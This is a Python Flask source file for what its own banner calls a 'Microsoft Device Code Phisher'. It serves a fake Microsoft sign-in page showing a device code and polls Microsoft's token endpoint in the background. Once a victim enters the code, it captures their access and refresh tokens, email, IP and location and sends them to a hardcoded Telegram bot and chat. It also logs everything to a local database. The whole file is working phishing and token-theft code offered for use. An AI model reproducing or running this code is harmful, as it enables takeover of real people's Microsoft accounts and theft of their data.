from flask import Flask, request, redirect, send_file, url_for, render_template_string
import sqlite3
import datetime
import json
import requests
import secrets
import os
import time
import threading

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

DB_NAME = "device_logs.db"

TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"
TELEGRAM_CHAT_ID = "8689962848"

# Microsoft Device Code endpoints
DEVICE_CODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office / Azure CLI client (very common)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS device_captures (
                 id INTEGER PRIMARY KEY,
                 timestamp TEXT,
                 user_code TEXT,
                 device_code TEXT,
                 email TEXT,
                 access_token TEXT,
                 refresh_token TEXT,
                 expires_in INTEGER,
                 ip TEXT,
                 location TEXT,
                 ua TEXT,
                 success INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def get_client_ip():
    return (request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr)

def get_location(ip):
    if not ip or ip in ['127.0.0.1', '::1', 'localhost']:
        return {"city": "Local", "country": "Local"}
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            return data
    except:
        pass
    return {"city": "Unknown", "country": "Unknown"}

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

def send_telegram_document(filename, caption):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, timeout=30)
    except:
        pass

def poll_for_tokens(device_code, user_code, ip, location, ua, max_attempts=60):
    """Background thread that polls Microsoft for token"""
    data = {
        'client_id': CLIENT_ID,
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
        'device_code': device_code
    }

    for attempt in range(max_attempts):
        try:
            resp = requests.post(TOKEN_URL, data=data, timeout=15)
            result = resp.json()

            if 'access_token' in result:
                # SUCCESS - Tokens received
                email = result.get('id_token_claims', {}).get('email') or result.get('id_token_claims', {}).get('preferred_username') or "Unknown"

                success_msg = f"""
🔥 <b>Microsoft Device Code SUCCESS!</b> 🔥

👤 <code>{email}</code>
🔑 User Code: <code>{user_code}</code>

🌐 {ip} — {location.get('city')}, {location.get('country')}
🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                """

                send_telegram_message(success_msg)

                # Save full tokens to JSON
                token_data = {
                    'timestamp': datetime.datetime.now().isoformat(),
                    'email': email,
                    'user_code': user_code,
                    'access_token': result.get('access_token'),
                    'refresh_token': result.get('refresh_token'),
                    'expires_in': result.get('expires_in'),
                    'scope': result.get('scope'),
                    'ip': ip,
                    'location': location,
                    'ua': ua
                }

                filename = f"device_success_{email.split('@')[0]}_{int(time.time())}.json"
                with open(filename, 'w') as f:
                    json.dump(token_data, f, indent=2)

                send_telegram_document(filename, f"✅ Device Code Success - {email}")
                os.remove(filename)

                # Save to DB
                conn = sqlite3.connect(DB_NAME)
                conn.execute("""INSERT INTO device_captures 
                    (timestamp, user_code, device_code, email, access_token, refresh_token, expires_in, ip, location, ua, success)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (datetime.datetime.now().isoformat(), user_code, device_code, email,
                     result.get('access_token'), result.get('refresh_token'), result.get('expires_in'),
                     ip, json.dumps(location), ua, 1))
                conn.commit()
                conn.close()

                print(f"✅ DEVICE CODE SUCCESS: {email}")
                return

            elif result.get('error') == 'authorization_pending':
                time.sleep(5)  # Microsoft recommends polling every 5 seconds
                continue
            elif result.get('error') == 'expired_token':
                print(f"❌ Device code expired for {user_code}")
                return
            else:
                print(f"Device code error: {result.get('error_description')}")
                return

        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)

    print(f"❌ Polling timeout for user code {user_code}")

@app.route('/')
def index():
    return send_file('index.html')  # You can create a convincing "Sign in with Microsoft" page

@app.route('/start', methods=['POST'])
def start_device_flow():
    ip = get_client_ip()
    ua = request.headers.get('User-Agent', '')
    location = get_location(ip)

    try:
        # Request device code from Microsoft
        payload = {
            'client_id': CLIENT_ID,
            'scope': 'openid profile offline_access https://graph.microsoft.com/.default'
        }

        resp = requests.post(DEVICE_CODE_URL, data=payload, timeout=15)
        data = resp.json()

        user_code = data.get('user_code')
        device_code = data.get('device_code')
        verification_uri = data.get('verification_uri')
        expires_in = data.get('expires_in', 900)

        if not user_code or not device_code:
            return "Error initiating device flow", 500

        message = f"""
📱 <b>New Microsoft Device Code Request</b>

🔢 User Code: <code>{user_code}</code>
🔗 Link: <a href="{verification_uri}">{verification_uri}</a>

🌐 {ip} — {location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}
🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        send_telegram_message(message)

        # Start polling in background thread
        threading.Thread(target=poll_for_tokens, args=(device_code, user_code, ip, location, ua), daemon=True).start()

        # Show nice waiting page with the code
        return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to Microsoft</title>
    <style>
        body { font-family: Segoe UI, sans-serif; background: #f3f2f1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 420px; text-align: center; }
        .code { font-size: 42px; letter-spacing: 8px; font-weight: bold; background: #f8f8f8; padding: 20px; border-radius: 8px; margin: 20px 0; }
        .logo { width: 100px; margin-bottom: 20px; }
    </style>
</head>
<body>
<div class="card">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
    <h2>Sign in to your Microsoft account</h2>
    <p>Open this page on another device and enter the code below:</p>
    <div class="code">{{ user_code }}</div>
    <p><strong>{{ verification_uri }}</strong></p>
    <p style="color:#666; font-size:14px;">This code will expire in 15 minutes.</p>
</div>
</body>
</html>
        ''', user_code=user_code, verification_uri=verification_uri)

    except Exception as e:
        print(f"Device code initiation failed: {e}")
        return redirect(url_for('index'))

if __name__ == '__main__':
    print("🚀 Microsoft Device Code Phisher Started (2026 Version)")
    print("📱 Visit: http://0.0.0.0:5000/")
    app.run(host='0.0.0.0', port=5000, debug=False)